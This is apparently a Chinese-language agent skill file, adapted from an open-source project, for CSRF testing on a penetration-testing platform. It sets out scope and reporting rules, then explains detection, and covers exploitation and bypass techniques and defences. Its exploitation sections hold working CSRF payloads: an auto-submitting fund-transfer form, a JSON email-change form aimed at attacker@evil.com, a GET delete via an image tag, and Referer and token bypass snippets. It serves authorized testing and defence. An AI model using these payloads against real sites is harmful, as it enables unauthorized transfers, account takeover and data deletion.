---
name: antifox-csrf-testing
description: "驗證跨站請求偽造、權杖與來源驗證（CSRF）。"
license: AGPL-3.0
---

改寫自 [AntiFox / csrf-testing](https://github.com/AntiFox-AI/antifox/blob/070f798bf590667bc2a0a13c687dd87d8a4413bf/skills/csrf-testing/SKILL.md)（AGPL-3.0）。原文與授權見 `${SKILL_DIR}/references/source.md`、`${SKILL_DIR}/references/LICENSE`。

## ARTEX 整合約定

1. 本文件提供方法與範例。先用目前可用的工具 schema、已核准範圍及實際環境決定步驟；範例的主機、帳號、回應與程式片段不是目前目標的事實。不要照抄範例中的廣域掃描、資料傾印、破壞、關閉 TLS 驗證或停用驗證設定。
2. 外部 CLI、商業產品、MCP 與 Python 套件均須另查是否已安裝、綁定及可執行。技能清單與工具相依索引不代表工具已就緒。沿用 ARTEX 現有代理、範圍與操作審批；載入技能不增加權限。
3. 可先用 `search_knowledge` 在目前可見技能中找相關段落，再用 `Skill` 載入完整程序。檢索結果是參考資料，不會解鎖 MCP，也不是漏洞證據。
4. 已確認的發現交給現有 `report_finding`；使用本次工具輸出的實際證據，保留前置條件、操作、預期結果與觀察結果。未確認的假設寫為 fact/hint，並標記不確定性。平台對話沒有任務上下文時，用現有任務交接工具。
5. HTTP 流量只使用已核實的引用，遵守目前的流量綁定開關及報告流程。`finding_id` 與 `finding_node_id` 是不同編號，依實際工具說明使用。無確切流量時保留文字與命令證據，不猜編號或為補證據重打目標。

# CSRF跨站请求伪造测试

## 概述

CSRF（Cross-Site Request Forgery）是一种利用用户已登录状态进行未授权操作的攻击方式。本技能提供CSRF漏洞的检测、利用和防护方法。

## 漏洞原理

- 攻击者诱导用户访问恶意页面
- 恶意页面自动发送请求到目标网站
- 浏览器自动携带用户的认证信息（Cookie、Session）
- 目标网站误认为是用户合法操作

## 测试方法

### 1. 识别敏感操作

- 密码修改
- 邮箱修改
- 转账操作
- 权限变更
- 数据删除
- 状态更新

### 2. 检测CSRF Token

**检查是否有Token保护：**
```html
<!-- 有Token保护 -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- 无Token保护 - 存在CSRF风险 -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. 验证Token有效性

**测试Token是否可预测：**
- Token是否基于时间戳
- Token是否基于用户ID
- Token是否可重复使用
- Token是否在多个请求间共享

### 4. 检查Referer验证

**测试Referer检查是否可绕过：**
```javascript
// 正常请求
Referer: https://target.com/change-password

// 测试绕过
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (空)
```

## 利用技术

### 基础CSRF攻击

**HTML表单自动提交：**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**绕过Content-Type检查：**
```html
<!-- 使用form表单提交JSON -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET请求CSRF

**利用GET请求进行攻击：**
```html
<img src="https://target.com/api/delete?id=123">
```

## 绕过技术

### Token绕过

**如果Token在Cookie中：**
```javascript
// 如果Token同时存在于Cookie和表单中
// 可以尝试只提交Cookie中的Token
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // 不包含csrf_token参数，依赖Cookie
});
```

### SameSite Cookie绕过

**利用子域名：**
- 如果SameSite=Lax，GET请求仍可携带Cookie
- 利用子域名进行攻击

### 双重提交Cookie

**绕过Token验证：**
```html
<!-- 如果Token在Cookie中，且验证逻辑有缺陷 -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // 从Cookie中读取Token
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## 工具使用

### Burp Suite

**使用CSRF PoC生成器：**
1. 拦截目标请求
2. 右键 → Engagement tools → Generate CSRF PoC
3. 测试生成的PoC

### OWASP ZAP

```bash
# 使用ZAP进行CSRF扫描
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## 验证和报告

### 验证步骤

1. 确认目标操作没有CSRF Token保护
2. 构造恶意请求并验证可执行
3. 评估影响（数据泄露、权限提升、资金损失等）
4. 记录完整的POC
5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议

### 报告要点

- 漏洞位置和受影响的操作
- 攻击场景和影响范围
- 完整的利用步骤和PoC
- 修复建议（CSRF Token、SameSite Cookie、Referer验证等）

## 防护措施

### 推荐方案

1. **CSRF Token**
   - 每个表单包含唯一Token
   - Token存储在Session中
   - 验证Token有效性

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **双重提交Cookie**
   - Token同时存在于Cookie和表单
   - 验证两者是否匹配

4. **Referer验证**
   - 验证Referer是否为同源
   - 注意空Referer的处理

## 注意事项

- 仅在授权测试环境中进行
- 避免对用户账户造成实际影响
- 记录所有测试步骤
- 考虑不同浏览器的行为差异
